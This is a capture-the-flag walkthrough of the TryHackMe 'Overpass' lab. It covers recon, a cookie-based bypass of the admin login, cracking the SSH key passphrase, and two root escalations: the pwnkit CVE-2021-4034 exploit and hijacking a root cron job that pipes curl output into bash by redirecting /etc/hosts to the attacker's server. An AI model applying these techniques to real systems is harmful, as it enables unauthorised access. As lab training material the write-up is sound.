# Overpass CTF

### Tasks: 
- Hack into the machine and get the *user.txt* flag 
- Escalate privileges and get the *root.txt* flag

<br>

### Step 1 - Recon
Since we're given an IP address of the target, let's use nmap to scan it and see if any ports are open:

``nmap -sV 10.10.192.255 -v``

And from the output, we can see that there are two ports open on the target machine. Port 22 (SSH) and 80 (HTTP):

![billede](https://user-images.githubusercontent.com/78546461/199543842-ef5db06d-bfb8-4c49-b94b-b6ec8292797d.png)

<br>

### Step 2 - Finding a way in

Since we don't have any idea of a username or password, the best thing to do here is to check out the webpage, on port 80.

![billede](https://user-images.githubusercontent.com/78546461/199544761-64cfaf7b-8612-4d88-85f8-fa42d42f7e76.png)

So the webpage is for a password manager. Well, we can obviously see that there is an *About Us* and a *Downloads* page, but perhaps there could be other pages as well. 

Before we check, let's see if the page source has anything of interest to offer.

![billede](https://user-images.githubusercontent.com/78546461/199545395-f5ea6101-e0fb-4fb6-bbff-03b07d96ee58.png)

Aha. So this alleged *Military Grade Encryption* is probably not what it sounds like. 

Based on the *Romans used it* part, my guess would be that they have used the *Caesar Cipher* as their encryption for the passwords. 

<br>

Anyway, let's scan the website with gobuster and see if there are other pages of interest:

``gobuster dir -u http://10.10.192.255 -w /usr/share/wordlists/dirb/common.txt``

This reveals that there are a couple more pages, which we didn't know about. 

However, there is only one page in particular that stands out as interesting, and that is the */admin* page. 

![billede](https://user-images.githubusercontent.com/78546461/199546875-051aecb3-4803-4ce2-ae56-46ddff3bf365.png)

<br>

Let's check it out:

![billede](https://user-images.githubusercontent.com/78546461/199547839-e1a230db-06c5-4535-a803-0b7fccb399c2.png)

<br>

Well, well, well. A login page. Let's try putting admin for both username and password:

![billede](https://user-images.githubusercontent.com/78546461/199548259-f85768dc-95c4-499d-adee-e8b54061b8d4.png)

<br>

Hmm.. We could always try brute forcing the login with hydra, but let's first see if there's anything of interest, using the developer tools:

![billede](https://user-images.githubusercontent.com/78546461/199548648-14915b36-9727-4241-af26-eff045204385.png)

So we have a JavaScript file for cookie and one for login. Alright, that might be something.

It doesn't seem like cookie.js is of much use, as it is just a long line of text, which might be auto-generated. 

login.js on the other hand, has some interesting information to offer. It seems like it will set a cookie if the credentials are not incorrect.

![billede](https://user-images.githubusercontent.com/78546461/199549814-2f06f479-fddc-4cfb-8afa-337e6b9a21d1.png)

<br>

Let's try that out for ourselves, in the console:

![billede](https://user-images.githubusercontent.com/78546461/199549975-d57c47db-05d6-488e-b714-7f290afa6e88.png)

<br>

And then refresh the page..

Aaand, we're in. And apparently there's some real valuable information on the very first page!

![billede](https://user-images.githubusercontent.com/78546461/199550652-b23e8cd8-329f-455e-9631-c441705d626d.png)

<br>

So, it seems like we have a potential username, if not two. But James seems like the lesser smart person here, so let's focus on him. 

We have his RSA Private Key right here on the page, so let's copy that into a new file and call it *id_rsa*.

And then try to login using the RSA key, through SSH with username james:

``ssh james@10.10.192.255 -i id_rsa``

![billede](https://user-images.githubusercontent.com/78546461/199551799-411463f7-7d38-4eee-81ef-0f77fa220fe1.png)

<br>

Hmm.. It wants a passphrase for the key file. Which we don't have. 

Let's try using ssh2john.py to see if we can get anything out of the RSA key:

``/opt/john/ssh2john.py``

<br>

This returns us a long string of text, that we can give to john and attempt to find the passphrase, by running it against a wordlist. I'll use the good old *rockyou.txt*:

But first, I'll save the output to a new file and call it *john_rsa*.

Now, let's give it a go with john:

``john --wordlist=/usr/share/wordlists/rockyou.txt john_rsa``

![billede](https://user-images.githubusercontent.com/78546461/199553339-4af8e119-4c0d-49b2-a7f0-8b6c577c3337.png)

<br>

Well, that was easy. So the passphrase should be *james13*. Let's try it out:

``ssh james@10.10.192.255 -i id_rsa`` 

![billede](https://user-images.githubusercontent.com/78546461/199553845-2c1ebd9a-4b21-47a9-8280-5cddef48f86c.png)

![billede](https://user-images.githubusercontent.com/78546461/199553961-7cd3849f-c4e3-425a-9ebc-be190fc33470.png)

<br><br>

### User flag

<br>

There we go. We're in! Now, let's find a flag.

``ls`` 

![billede](https://user-images.githubusercontent.com/78546461/199554136-55d814d0-4a64-4bc4-a709-62597ba22a53.png)

<br>

There we have our user.txt. 

![billede](https://user-images.githubusercontent.com/78546461/199554329-cfb9b7b8-3c7e-4e85-a0b1-0d9f05b060d5.png)

<br><br>

Nice. Now, let's get the root flag.

<br>

### Root flag

<br>

Now, to make life a little easy, let's try to get an enumeration tool, such as linpeas onto the target machine.

Note: linpeas, as well as winpeas, can be downloaded from the official author's GitHub page: https://github.com/carlospolop/PEASS-ng 

First, I'll open up a http server with python on my host machine, in the directory where linpeas.sh is:

<br>

``python3 -m http.server 4444``

<br>

And then, on the target machine, I'll use wget to download the linpeas.sh file. This will only work in a directory where our user has read+write access, so I'll use the /tmp directory:

<br> 

``wget [my-ip]:4444/usr/share/peass/linpeas/linpeas.sh``

<br>

And now that we have linpeas on our target, let's change the file mode bits with chmod, to make linpeas.sh an executable for us:

<br>

``chmod +x linpeas.sh``

<br>

And then run it:

<br>

``./linpeas.sh``

<br><br>

linpeas will show a lot of information. And a lot of it is not really of interest to us. However, it does show us a couple of interesting things, that can be potentially exploited. 

The first one is a very likely exploit, found by the CVEs Check. The exploit is CVE-2021-4034 (PolicyKit-1 0.105-31). 

Further down, it tells us a download link from github which we technically could use wget a command to get, but it doesn't seem to be working very well on our target.. 
However, we can look it up on exploit-db and see what it's all about: 

https://www.exploit-db.com/exploits/50689

<br>

Ah. So we can actually just create a couple of files in our tmp directory, based on the code from the website, and then run the code afterwards, using the commands shown.

Let's make the files: 

``nano evil-so.c``

<br>

And we put the code from the page, where it says "##### evil-so.c #####", into the file. Then we save it and move on to the next one:

``nano exploit.c``

<br>

And we do the same thing here as well, copy-pasting the code, where it says "##### exploit.c #####". 

<br><br>

Just to be sure, I make the files executable:

``chmod +x evil-so.c``

``chmod +x exploit.c``

<br>

Now, let's run the gcc commands, shown on the website:

``gcc -shared -o evil.so -fPIC evil-so.c``

``gcc exploit.c -o exploit``

<br>

And then run the file called "exploit":

``./exploit``

<br><br>

BOOM! We are root! 

``whoami``

<br>

Now, we don't have an interactive shell, but that can easily be solved with:

``/bin/bash``

<br>

And just like stealing candy from a baby, there is nothing stopping us from going straight into the /root directory and getting our flag:

``cd /root && ls -l``

``cat root.txt``

<br>

![billede](https://user-images.githubusercontent.com/78546461/200057349-7a343073-7523-4303-8696-cb9f59729428.png)

<br>

---

### This is the most probable way, that TryHackMe actually intended us to use

<br>

If we go back to the step where we had used linpeas to enumerate and then focus on a line further down, we can see that there's a cron job running every minute:

<br>

![billede](https://user-images.githubusercontent.com/78546461/200057999-667b11a6-b1b8-4eb7-bf0f-6435c53155d4.png)

<br>

So from what we can see here, the command ``root curl overpass.thm/downloads/src/buildscript.sh | bash`` is running every minute.

This means that each minute, the command will pipe the script "buildscript.sh" into bash, with root privileges. And the script seems to be on a different server.. 

Hmmm... Wonder if we can do anything with that.. hehe..

<br>

If we take a look into the folder /etc/hosts, we'll actually find *overpass.thm* and the corresponding IP address. 

And guess what.. the file is world-writable! So we can just edit it if we want.. Oh boy, this means trouble!

<br>

Let's edit it, to make a request to our IP address instead.

But first, we have to make the necessary directories and script, so that it actually has something to download.

So, on our host machine, we can go into the / directory, ``cd /`` and then use the commands:

``sudo mkdir downloads/src -p``

``sudo nano buildscript.sh``

<br>

And then we can write our script, which will be executed by the target, with root privileges. Let's not forget the *#!/bin/bash* at the top of our script:

``#!/bin/bash

  sudo cp /root/root.txt /root.txt && chmod +r /root.txt james``
  
<br>

And then, we can go back into the / directory, and with ``ls -l``, we can see that we now have a *root.txt* file, which we can read from.

Let's read it then! ``cat root.txt``

<br>

![billede](https://user-images.githubusercontent.com/78546461/200060519-49250209-8f08-4404-9512-1544f1171580.png)

<br>

And that's it!

Two different ways of getting the flag.

<br>

We could also have used a reverse shell or gotten the flag in other ways, but for the sake of simplicity, I'll stop here. 

However, feel free coming up with new ways of getting the root flag, by editing the *buildscript*.sh script in the /downloads/src directory, on your host machine. 😈

<br><br>


#### Made by PatrickSkovgaard, otherwise known as AgoraPat on TryHackMe 
